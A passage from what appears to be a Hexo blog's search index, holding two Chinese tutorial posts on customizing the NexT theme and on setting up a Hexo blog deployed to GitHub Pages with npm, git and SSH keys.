i(e){var a=t.createElement(&quot;div&quot;);a.className=&quot;heart&quot;,d.push({el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()}),t.body.appendChild(a)}function c(e){var a=t.createElement(&quot;style&quot;);a.type=&quot;text/css&quot;;try{a.appendChild(t.createTextNode(e))}catch(t){a.styleSheet.cssText=e}t.getElementsByTagName(&quot;head&quot;)[0].appendChild(a)}function s(){return&quot;rgb(&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;)&quot;}var d=[];e.requestAnimationFrame=function(){return e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(e){setTimeout(e,1e3/60)}}(),n()}(window,document);修改超链接的颜色效果图实现方法 打开H:\blog\themes\next\source\css\_common\components\post文件夹下的post.styl,添加以下css样式：12345678.post-body p a &#123; color: #0593d3; border-bottom: none; &amp;:hover &#123; color: #fc6423; text-decoration: underline; &#125;&#125; 其中选择.post-body 是为了不影响标题，选择 p 是为了不影响首页“阅读全文”的显示样式,颜色可以自己定义。文章结尾添加结束标记效果图实现方法 打开H:/blog/themes/next/layout/_macro文件夹，新建passage-end-tag.swig 文件,并添加以下内容：12345&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style="text-align:center;color: #ccc;font-size:14px;"&gt;-------------本文结束&lt;i class="fa fa-paw"&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt; 然后打开H:/blog/themes/next/layout/_macro/post.swig文件，在post-body 之后， post-footer 之前添加以下代码：12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'passage-end-tag.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; 接着在H:/blog/themes/next/_config.yml末尾添加：123# 文章末尾添加“本文结束”标记passage_end_tag: enabled: true修改文章底部带#号的标签效果图实现方法 修改H:/blog/themes/next/layout/_macro/post.swig，搜索 rel=&quot;tag&quot;&gt;#，将 # 换成&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;设置博客头像并旋转效果图实现方法 打开H:/blog/themes/next/source/images,把头像放到该目录下，然后打开H:/blog/_config.yml,找到avatar:，修改为以下内容：1234567891011avatar: # In theme directory (source/images): /images/avatar.gif # In site directory (source/uploads): /uploads/avatar.gif # You can also use other linking images. url: /images/avatar.gif # If true, the avatar would be dispalyed in circle. rounded: true # The value of opacity should be choose from 0 to 1 to set the opacity of the avatar. opacity: 1 # If true, the avatar would be rotated with the cursor. rotated: true快速实现博客压缩 项目压缩也叫代码丑化, 分别对 html、css、js、images进行优化，即把重复的代码合并，把多余的空格去掉，用算法把 images 进行压缩。压缩后的博客，加载速度会有较大的提升，自然能留住更多游客。 蛮多朋友使用了gulp对博客进行压缩，这也是一个办法，但在社区逛了下，找到了一个比较好用的模块hexo-all-minifier，这个模块集成了对 html、css、js、image 的优化。1npm install hexo-all-minifier --save 安装上此模块后，只要在根目录下的_config.yml文件中加上如下字段就可对博客所有内容进行压缩。12345678910111213141516171819202122232425html_minifier: enable: true ignore_error: false exclude:css_minifier: enable: true exclude: - '*.min.css'js_minifier: enable: true mangle: true output: compress: exclude: - '*.min.js'image_minifier: enable: true interlaced: false multipass: false optimizationLevel: 2 pngquant: false progressive: false侧边栏添加社交图标效果图实现方法 打开主题配置文件_config.yml，搜索social:,在图标库找自己喜欢的小图标，并将名字复制在如下位置，保存即可主页文章添加阴影效果效果图实现方法 打开H:\blog\themes\next\source\css\_common\components\post文件夹下的post.styl,添加以下css样式：12345678// 主页文章添加阴影效果 .post &#123; margin-top: 0px; margin-bottom: 60px; padding: 25px; -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5); -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5); &#125;在博客底部添加访问量效果图实现方法 打开H:/blog/themes/next/_config.yml,找到busuanzi，修改为以下参数：123456busuanzi_count: enable: true total_visitors: true total_visitors_icon: user total_views: true total_views_icon: eye使用leancloud统计页面访问次数效果图实现方法 主题集成了leancloud，但是我们还需要去官网注册账号并实名，这里讲一下关键的步骤。配置leancloud创建应用：控制台 --&gt; 创建应用（开发版）应用名称可以随意输入，后面还可以修改，我的是blog创建class： 点击刚创建的应用，创建一个 Class 表用来保存我们的博客访问数据。此处创建的 Class 名字必须为 Counter，ACL 权限选择 无限制。创建 Class 完成之后，新创建的 Counter 表会显示在左侧，这时再切换到 test 应用的 设置 - 应用 Key 界面：复制ID和Key启用leancloud 打开_config.yml主题配置文件，找到leancloud_visitors:,填入id和key。修改热度 打开H:/blog/themes/next/layout/_macro/post.swig文件，找到leancloud,修改成如下代码： 最后打开H:/blog/themes/next/languages/zh-CN.yml,把views参数改成如下：博客标题设置 这个相关的设置在H:/blog/_config.yml中修改，如下图所示：博客底部添加网站的运行时间效果图实现方法 打开H:/blog/themes/next/layout/_partials/footer.swig，在末尾添加如下代码;12345678910111213141516171819&lt;!-- 网站运行时间的设置 --&gt;&lt;span id="timeDate"&gt;载入天数...&lt;/span&gt;&lt;span id="times"&gt;载入时分秒...&lt;/span&gt;&lt;script&gt; var now = new Date(); function createtime() &#123; var grt= new Date("07/12/2019 18:30:00");//此处修改你的建站时间或者网站上线时间 now.setTime(now.getTime()+250); days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); if(String(hnum).length ==1 )&#123;hnum = "0" + hnum;&#125; minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); mnum = Math.floor(minutes); if(String(mnum).length ==1 )&#123;mnum = "0" + mnum;&#125; seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); snum = Math.round(seconds); if(String(snum).length ==1 )&#123;snum = "0" + snum;&#125; document.getElementById("timeDate").innerHTML = "网站已运行 "+dnum+" 天 "; document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; &#125;setInterval("createtime()",250);&lt;/script&gt;添加 README.md 文件 每个项目下一般都有一个 README.md 文件，但是使用 hexo 部署到仓库后，项目下是没有 README.md 文件的。 在 Hexo 目录下的 source 根目录下添加一个 README.md 文件，修改站点配置文件 _config.yml，将 skip_render 参数的值设置为skip_render: README.md 保存退出即可。再次使用 hexo d 命令部署博客的时候就不会在渲染 README.md 这个文件了。自定义网站的图标效果图实现方法 我的图标是在阿里矢量图标库下载的，你也可以在其他地方下载或者制作，然后把图标放在H：/blog/themes/next/source/images里面，斌且修改主题配置文件：1234567favicon: small: /images/favicon-16x16-next.png medium: /images/favicon-32x32-next.png apple_touch_icon: /images/apple-touch-icon-next.png safari_pinned_tab: /images/logo.svg #android_manifest: /images/manifest.json #ms_browserconfig: /images/browserconfig.xml文章字数、阅读时长统计效果图实现效果 打开博客根目录，运行以下命令，安装插件1npm install hexo-symbols-count-time --save 然后修改博客配置文件，在末尾添加以下代码：123456symbols_count_time: symbols: true # 文章字数统计 time: true # 文章阅读时长 total_symbols: true # 站点总字数统计 total_time: true # 站点总阅读时长 exclude_codeblock: false # 排除代码字数统计 最后在主题配置文件里面，找到symbols_count_time,修改成以下内容：1234567symbols_count_time: separated_meta: true # 是否另起一行（true的话不和发表时间等同一行） item_text_post: true # 首页文章统计数量前是否显示文字描述（本文字数、阅读时长） item_text_total: true # 页面底部统计数量前是否显示文字描述（站点总字数、站点阅读时长） awl: 1.5 # Average Word Length wpm: 100 # Words Per Minute（每分钟阅读词数） suffix: mins.博客顶端添加加载条效果图实现方法 打开主题配置文件，找到pace:，修改为以下内容：123456pace: true# Themes list:# pace-theme-big-counter | pace-theme-bounce | pace-theme-barber-shop | pace-theme-center-atom# pace-theme-center-circle | pace-theme-center-radar | pace-theme-center-simple | pace-theme-corner-indicator# pace-theme-fill-left | pace-theme-flash | pace-theme-loading-bar | pace-theme-mac-osx | pace-theme-minimalpace_theme: pace-theme-minimal在文章底部添加版权信息效果图实现方法 打开H：/blog/themes/next/layout/_macro，添加my-copyright.swig，代码如下：12345678910111213141516171819202122232425262728293031&#123;% if page.copyright %&#125;&lt;div class="my_post_copyright"&gt; &lt;script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"&gt;&lt;/script&gt; &lt;!-- JS库 sweetalert 可修改路径 --&gt; &lt;script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"&gt;&lt;/script&gt; &lt;script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"&gt;&lt;/script&gt; &lt;link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css"&gt; &lt;p&gt;&lt;span&gt;本文标题:&lt;/span&gt;&#123;&#123; page.title &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;span&gt;文章作者:&lt;/span&gt;&#123;&#123; theme.author &#125;&#125;&lt;/a&gt; | 【公众号：不会代码的程序猿】&lt;/p&gt; &lt;p&gt;&lt;span&gt;发布时间:&lt;/span&gt;&#123;&#123; page.date.format("YYYY年MM月DD日 HH:mm:ss") &#125;&#125;&lt;/p&gt; &lt;p&gt;&lt;span&gt;最后更新:&lt;/span&gt;&#123;&#123; page.updated.format("YYYY年MM月DD日 HH:mm:ss") &#125;&#125;&lt;/p&gt; &lt;p&gt;&lt;span&gt;原始链接:&lt;/span&gt;&lt;a href="&#123;&#123; url_for(page.path) &#125;&#125;" title="&#123;&#123; page.title &#125;&#125;"&gt;&#123;&#123; page.permalink &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;span&gt;许可协议:&lt;/span&gt;&lt;i class="fa fa-creative-commons"&gt;&lt;/i&gt; &lt;a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)"&gt;署名-非商业性使用-禁止演绎 4.0 国际&lt;/a&gt; 转载请保留原文链接及作者。&lt;/p&gt; &lt;/div&gt;&lt;script&gt; var clipboard = new Clipboard('.fa-clipboard'); clipboard.on('success', $(function()&#123; $(".fa-clipboard").click(function()&#123; swal(&#123; title: "", text: '复制成功', html: false, timer: 500, showConfirmButton: false &#125;); &#125;); &#125;)); &lt;/script&gt;&#123;% endif %&#125; 然后在H：/blog/themes/next/source/css/_common/components/post/下添加my-post-copyright.styl：123456789101112131415161718192021222324252627282930313233343536373839404142434445.my_post_copyright &#123; width: 85%; max-width: 45em; margin: 2.8em auto 0; padding: 0.5em 1.0em; border: 1px solid #d3d3d3; font-size: 0.93rem; line-height: 1.6em; word-break: break-all; background: rgba(255,255,255,0.4);&#125;.my_post_copyright p&#123;margin:0;&#125;.my_post_copyright span &#123; display: inline-block; width: 5.2em; color: #333333; // title color font-weight: bold;&#125;.my_post_copyright .raw &#123; margin-left: 1em; width: 5em;&#125;.my_post_copyright a &#123; color: #808080; border-bottom:0;&#125;.my_post_copyright a:hover &#123; color: #0593d3; // link color text-decoration: underline;&#125;.my_post_copyright:hover .fa-clipboard &#123; color: #000;&#125;.my_post_copyright .post-url:hover &#123; font-weight: normal;&#125;.my_post_copyright .copy-path &#123; margin-left: 1em; width: 1em; +mobile()&#123;display:none;&#125;&#125;.my_post_copyright .copy-path:hover &#123; color: #808080; cursor: pointer;&#125; 然后打开H:/blog/themes/next/layout/_macro/post.swig文件，在post-body 之后， post-footer 之前添加以下代码：12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'my-copyright.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; 最后修改next/source/css/_common/components/post/post.styl文件，在最后一行增加代码：1@import "my-post-copyright"添加来必力评论系统效果图实现方法 打开来必力的官网，注册，注册好之后打开设置页面，填写博客地址 然后在代码管理页面，把uid复制到主题配置文件_config.yml的livere_uid:修改博客底部的红色跳动爱心 打开主题配置文件，找到footer:，修改为以下内容：DaoVoice在线联系效果图实现方法 先在 daovoice 注册账号，邀请码是dda712fb，注册完成后会得到一个 app_id : 然后打开/themes/next/layout/_partials/head.swig,在末尾添加如下代码：123456789&#123;% if theme.daovoice %&#125; &lt;script&gt; (function(i,s,o,g,r,a,m)&#123;i["DaoVoiceObject"]=r;i[r]=i[r]||function()&#123;(i[r].q=i[r].q||[]).push(arguments)&#125;,i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)&#125;)(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/dda712fb.js","daovoice") daovoice('init', &#123; app_id: "&#123;&#123;theme.daovoice_app_id&#125;&#125;" &#125;); daovoice('update'); &lt;/script&gt;&#123;% endif %&#125; 最后打开主题配置文件，在末尾添加如下代码：123# Online contactdaovoice: truedaovoice_app_id: 这里填你的刚才获得的 app_id设置博客摘要显示 打开主题配置文件，修改为以下内容： 这样就能实现在主页只展示部分文字，其他文字隐藏起来，通过点击’阅读更多’来阅读全文。在写每一篇文章的时候，也要在必要的地方添加&lt;!-- more --&gt;123456789101112131415---title: 使用Github+Hexo搭建你的个人博客：搭建篇copyright: truedate: 2019-07-21 15:25:12categories: Hexotags: [GitHub,个人博客,Hexo]---&lt;blockquote class="blockquote-center"&gt;海阔凭鱼跃，天高任鸟飞。&lt;/blockquote&gt; 早在初中，就想着自己搭起一个属于自己的网站，但是没有技术又不肯学习的我，怯于尝试，一直停滞不前。大学期间终于学习了，又因为自己的懒惰，觉得很难，不肯去尝试。直至今日，我想试一试，捣鼓了好一阵子，发现认真去做了，也没有想象中的难。&lt;!-- more --&gt;文章链接唯一化 也许你会数次更改文章题目或者变更文章发布时间，在默认设置下，文章链接都会改变，不利于搜索引擎收录，也不利于分享。唯一永久链接才是更好的选择。 首先安装插件1npm install hexo-abbrlink --save 然后在站点配置文件中找到permalink，修改为如下内容：1permalink: posts/:abbrlink/ # “posts/” 可自行更换 这里有个知识点：百度蜘蛛抓取网页的规则: 对于蜘蛛说网页权重越高、信用度越高抓取越频繁，例如网站的首页和内页。蜘蛛先抓取网站的首页，因为首页权重更高，并且大部分的链接都是指向首页。然后通过首页抓取网站的内页，并不是所有内页蜘蛛都会去抓取。 搜索引擎认为对于一般的中小型站点，3层足够承受所有的内容了，所以蜘蛛经常抓取的内容是前三层，而超过三层的内容蜘蛛认为那些内容并不重要，所以不经常爬取。出于这个原因所以permalink后面跟着的最好不要超过2个斜杠。 接着在站点配置文件中添加如下代码:123# abbrlink configabbrlink: alg: crc32 # 算法：crc16(default) and crc32rep: hex # 进制：dec(default) and hex可选择模式：crc16 &amp; hexcrc16 &amp; deccrc32 &amp; hexcrc32 &amp; dec修改顶端的线条颜色 next主题顶端的线条颜色默认是黑色的，我看着不舒服就把它改成了粉色效果图实现方法 打开themes/next/source/css/_variables/base.styl,找到headband，修改为以下内容：1234// Headband// --------------------------------------------------$headband-height = 2px$headband-bg = #e3cae4去除文章下方分类于的下划线 打开themes/next/source/css/_common/scaffolding/base.styl,找到span.exturl，修改为以下内容：12345678a, span.exturl &#123; word-wrap(); // Remove the gray background color from active links in IE 10. background-color: transparent; color: #999999; text-decoration: none; outline: none; border-bottom: 0px solid $link-decoration-color;左侧社交图标居中 强迫症的我居然发现了左侧社交图标似乎不太居中啊，一定得把它搞居中。效果图实现方法 打开themes/next/source/css/_schemes/Pisces/_sidebar.styl,找到.site-overview，修改为以下内容：1234.site-overview &#123; //margin: 0 2px; text-align:&#125;建立阅读排行榜 新建一个阅读排行榜界面，，用于显示本站文章的阅读排行榜，基于lencloud进行统计新建页面 hexo n page top 新建页面，生成 top 目录，编辑其中自动生成的 index.md 文件，将其中的代码替换如下：12345678910111213141516171819202122232425&lt;div id="top"&gt;&lt;/div&gt;&lt;script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"&gt;&lt;/script&gt;&lt;script&gt;AV.initialize("leancloud_appid这里填入你的id", "leancloud_appkey这里填入你的key");&lt;/script&gt;&lt;script type="text/javascript"&gt; var time=0 var title="" var url="" var query = new AV.Query('Counter'); query.notEqualTo('id',0); query.descending('time'); query.limit(1000); query.find().then(function (todo) &#123; for (var i=0;i&lt;1000;i++)&#123; var result=todo[i].attributes; time=result.time; title=result.title; url=result.url; // var content="&lt;a href='"+"https://hoxis.github.io"+url+"'&gt;"+title+"&lt;/a&gt;"+"&lt;br&gt;"+"&lt;font color='#fff'&gt;"+"阅读次数："+time+"&lt;/font&gt;"+"&lt;br&gt;&lt;br&gt;"; var content="&lt;p&gt;"+"&lt;font color='#e20404'&gt;"+"【热度"+time+"℃】"+"："+"&lt;a href='"+"https://xiaoxiaoxiaoxiaolin.github.io"+url+"'&gt;"+title+"&lt;/a&gt;"+"&lt;/p&gt;"; document.getElementById("top").innerHTML+=content &#125; &#125;, function (error) &#123; console.log("error"); &#125;);&lt;/script&gt; 里面的leancloud_appid、leancloud_appkey 还有页面链接记得替换成你的。编辑菜单 打开主题配置文件，添加top：1234567menu: home: / || home top: /top/ || signal categories: /categories/ || th tags: /tags/ || tags archives: /archives/ || archive about: /about/ || user 然后还需要对中文配置hexo/blog/themes/next/languages/zh-CN.yml进行修改，添加top对应的中文：1234567891011menu: home: 首页 top: 热榜 archives: 归档 categories: 分类 tags: 标签 about: 关于 search: 搜索 schedule: 日程表 sitemap: 站点地图 commonweal: 公益 404github分支管理博客 使用hexo发布博客最麻烦的地方在于，当你换了一台电脑后又想发布博客，又得把先前的环境重新搭建，拉取仓库。因为在github中的我们github.io项目是只有编译后的文件的，没有源文件的，也就是说，如果我们的电脑坏了，打不开了，我们的博客就不能进行更新了，所以我们要把我们的源文件也上传到github上。这个时候可以选择新建一个仓库来存放源文件，也可以把源文件 push 到 user.github.io 的其他分支。我选择了后者。创建分支 创建两个分支：master 与 hexo,（这个hexo分支就是存放我们源文件的分支，我们只需要更新hexo分支上的内容据就好，master上的分支hexo编译的时候会更新的）初始化仓库 然后我们再初始化仓库，重新对我们的代码进行版本控制12git initgit remote add origin &lt;server&gt; &lt;server&gt;是指在线仓库的地址。origin是本地分支,remote add操作会将本地仓库映射到云端将博客源文件上传到分支 .gitignore文件作用是声明不被git记录的文件，blog根目录下的.gitignore是hexo初始化带来的，可以先删除或者直接编辑，对hexo不会有影响。建议.gitignore内添加以下内容：123/.deploy_git/public/_config.yml .deploy_git是hexo默认的.git配置文件夹，不需要同步 public内文件是根据source文件夹内容自动生成，不需要备份，不然每次改动内容太多 即使是私有仓库，除去在线服务商员工可以看到的风险外，还有云服务商被攻击造成泄漏等可能，所以不建议将配置文件传上去依次执行123git add .git commit -m "..."git push origin hexo更改标签云的颜色 打开/blog/themes/next/layout/page.swig，找到tagcloud，修改为以下内容：1&#123;&#123; tagcloud(&#123;min_font: 13, max_font: 31, amount: 1000, color: true, start_color: '#9733EE', end_color: '#FF512F'&#125;) &#125;&#125; start_color和end_color的颜色你可以自己随意定义。参考资料：使用 Hexo 搭建 GitHub Page 博客(二)–使用 GitHub 分支保存 Hexo 环境和博文hexo 摸爬滚打之进阶教程GitHub–创建新的分支(转)打造个性超赞博客 Hexo + NexT + GitHub Pages 的超深度优化hexo的next主题个性化教程:打造炫酷网站 | Moorez4块钱,用Github+Hexo搭建你的个人博客：美化篇还有一些参考的资料链接已经找不到了，所以就不一一列出了。第一次写，如有错误，欢迎指出，不胜感激。]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
        <tag>个人博客</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Github+Hexo搭建你的个人博客：搭建篇]]></title>
    <url>%2Fposts%2F9464af1e.html</url>
    <content type="text"><![CDATA[海阔凭鱼跃，天高任鸟飞 早在初中，就想着自己搭起一个属于自己的网站，但是没有技术又不肯学习的我，怯于尝试，一直停滞不前。大学期间终于学习了，又因为自己的懒惰，觉得很难，不肯去尝试。直至今日，我想试一试，捣鼓了好一阵子，发现认真去做了，也没有想象中的难。 其实早在放假之前，我就一直在捣鼓自己的博客了，使用的是Django。搞了好一阵子，就只剩一些细节的问题，准备上线的时候，Hexo出现在我的眼前,简约的风格一下子吸引了我，这正是我想要的。好了，别说了，我改还不行吗，就这样我已经搭好准备上线的Django，转入Hexo。自己建站的原因 网上这么多现成的博客不用，为什么非得浪费这么多时间去自己搭建呢？ 可能会有人这样说：很多网站都能写博客，干嘛这么浪费时间呢？ 在这里我说一下我想自己搭建的原因: 1、网上大部分的博客功能都是差不多的，但是限制也是挺多的，花里胡哨的广告，文章不管是自己还是别人看，体验都很不舒服。 2、除了广告的原因，排版的限制以外，拥有一个自己可以随意定制的博客网站，内容和排版都自己可以随意决定，是不是很酷。 除此以外，自己在这段时间确实学习到了很多。宅在家里好一段时间，除了吃饭睡觉就是搭建自己的博客。搭建博客也是成为了我学习的动力，现在搭建好了之后，也不会觉得没有事情干，相反，会因为博客的空白而继续努力学习、写博客、写自己的想法，努力让自己的博客、生活、还有学习充实起来。开始搭建博客什么是Hexo？ Hexo是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。环境部署Hexo安装前提 安装 Hexo 相当简单。然而在安装前，必须检查电脑中是否已安装下列应用程序：Node.js (Should be at least nodejs 6.9)Git 如果你的电脑中已经安装上述必备程序，那么恭喜！接下来只需要使用 npm 即可完成 Hexo 的安装。1npm install -g hexo-cli 如果你的电脑中尚未安装所需要的程序，请自行百度或者Google完成安装。 安装好所有环境之后，可以用以下命令是否安装成功，如果有返回版本信息说明安装成功。123git versionnode -vnpm -vHexo安装安装hexo 桌面右键点击git bash here，打开git软件界面，输入以下命令并回车：12npm install hexo-cli -gnpm install hexo-deployer-git --save 第一句是安装hexo，第二句是安装hexo部署到git page的deployer。设置博客存放的目录1234hexo init /h/blogcd /h/blognpm install*注：/h/bog可以更改为你自己的文件夹* 有的教程是先建立起博客的文件夹，再在该文件夹下右键鼠标，点击Git Bash Here，进入Git命令框，再执行以下操作。操作因人而异，没多大影响，只要能成功搭建就没问题了。查看博客的效果 至此，一个博客就初步搭建好了，先预览一下：1hexo g &amp;&amp; hexo s 然后在浏览器中打开：localhost:4000就可以看到博客的样子了。 打开该网址，你可以看到第一篇默认的博客：Hello World。虽然看起来有点难看，但是后续我们可以通过重新选择模板来对博客进行美化。把博客部署到GitHubGithub账号注册及配置 如果你没有github帐号，就新建一个，然后去邮箱进行验证；如果你有帐号则直接登录。官网：https://github.com/建立new repository 只填写username.github.io即可，然后点击create repositrory。 注意：username.github.io 的username要和用户名保持一致，不然后面会失败。以我的为例：开启gh-pages功能 点击github主页点击头像下面的profile,找到新建立的username.github.io文件打开，点击settings，往下拉动鼠标到GitHub Pages。如果你看到上方出现以下警告：GitHub Pages is currently disabled. You must first add content to your repository before you can publish a GitHub Pages site 不用管，点击选择choose a theme，随便选择一个，然后select theme保存就行了。配置ssh密钥 配置Github的SSH密钥可以让本地git项目与远程的github建立联系，让我们在本地写了代码之后直接通过git操作就可以实现本地代码库与Github代码库同步。操作如下：看看是否存在SSH密钥 首先，我们需要看看是否看看本机是否存在SSH keys,打开Git Bash,并运行：1cd ~/. ssh 检查你本机用户home目录下是否存在.ssh目录 如果，不存在此目录，则进行第二步操作，否则，你本机已经存在ssh公钥和私钥，可以略过第二步，直接进入第三步操作。创建一对新的SSH密钥12$ssh-keygen -t rsa -C "your_email@example.com"#这将按照你提供的邮箱地址，创建一对密钥，记得修改 直接回车，则将密钥按默认文件进行存储。此时也可以输入指定的文件夹。然后根据提示，你需要输入密码和确认密码，其实可以不用密码，就是到输密码的地方，都直接回车，所以每次push就只管回车就行了。跟着提示操作就对了，这里没什么坑。在GitHub账户中添加公钥 运行如下命令，并将公钥的内容复制。1clip &lt; ~/.ssh/id_rsa.pub登陆GitHub，进入账户设置，在SSH Keys粘贴添加就可以了测试 输入以下命令，看看[设置是否成功，git@github.com的部分不要修改：1$ ssh -T git@github.comThe authenticity of host ‘github.com (207.97.227.239)’ can’t be established.RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.Are you sure you want to continue connecting (yes/no)? 如果是第一次的会提示是否continue，输入yes就会看到：You’ve successfully authenticated, but GitHub does not provide shell access 。这就表示已成功连上github。设置用户信息 现在你已经可以通过SSH链接到GitHub了，还有一些个人信息需要完善的。 Git会根据用户的名字和邮箱来记录提交。GitHub也是用这些信息来做权限的处理，输入下面的代码进行个人信息的设置，把名称和邮箱替换成你自己的，名字根据自己的喜好自己取，而不是GitHub的昵称。12$ git config --global user.name "你的用户名"//用户名$ git config --global user.email "你的邮箱"//填写自己的邮箱将本地的Hexo文件更新到GitHub的库中 SSH Key配置成功后，接下来我们要把本地的Hexo文件上传到GitHub库中。 打开Hexo文件夹下的_config.yml，这个是博客的配置文件，添加你的GitHub page url 然后执行以下命令：1hexo g &amp;&amp; hexo d 或者 hexo g -d 此时在浏览器打开你的主页地址，你就能看到你的博客了。写下自己的第一篇博客 接下来你可以在博客的根目录下运行命令：1hexo new "第一篇博客" 然后打开D:\blog\source\_posts文件夹，就可以看到一个第一篇博客.md的文件，用支持markdown语法的软件打开该文件进行编辑即可。 编辑好以后，运行下述命令：1hexo clean &amp;&amp; hexo d -g 然后，在网址中输入username.github.io即可看到你的博客上，出现“第一篇博客”这篇新的文章。 至此，你的个人博客初步搭建过程就完成了。相关补充 在以后的博客发布，都是需要使用Markdown语法去写的，所以我们需要对markdown有所了解。 关于markdown的语法介绍可以看看这篇文章：markdown——入门指南 当你大致了解markdown语法后，如何用markdown写博客呢？不妨参考这两篇详细教程：Markdown语法说明Hexo下的Markdown语法(GFM)写博客 接下来你还得需要一个高效的markdown软件，这里我是用的是Typora，安装好后就可以打开刚刚的第一篇博客.md，开始尝试写你的第一篇博客了。 写完之后，别忘了在博客根目录下再次运行：1hexo clean &amp;&amp; hexo d -g 到这里，博客的初步搭建就算完成了，如果中间出现差错，请保持耐心多试几次，办法总比问题多嘛！关于Hexo的一些了解和常用命令，请自行查阅官方文档，一般可解决大部分的问题。 此时，还有一个比较重要的问题就是，博客的美化问题，下一篇文章，我会以我的博客为例，讲一讲我的博客是如何进行美化的。 第一次写博客，如有问题，欢迎指出，谢谢各位大佬，我会继续努力的。]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
        <tag>个人博客</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
</search>
